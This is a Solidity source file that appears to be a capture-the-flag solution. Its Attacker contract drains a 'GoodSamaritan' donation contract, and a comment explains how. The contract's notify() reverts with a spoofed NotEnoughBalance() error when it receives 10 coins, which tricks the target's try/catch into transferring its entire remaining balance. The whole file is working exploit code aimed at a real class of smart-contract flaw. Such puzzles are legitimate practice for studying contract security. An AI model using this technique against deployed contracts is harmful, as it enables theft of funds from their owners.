// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
Solution:
We exploited requestDonation() logic try and catch.
As try catch revert if balance is lower than 10 and transfer the remaining balance.
But after receiving 10 we still reverted it with NotEnoughBalance() and the remaining balance got transferred to us.
*/

interface IGoodSamaritan  {
    function requestDonation() external returns (bool enoughBalance);
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract Attacker is INotifyable {

    error NotEnoughBalance();

    IGoodSamaritan target;

    constructor(address _target) {
        target = IGoodSamaritan(_target);
    }

    function attack() public {
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if(amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
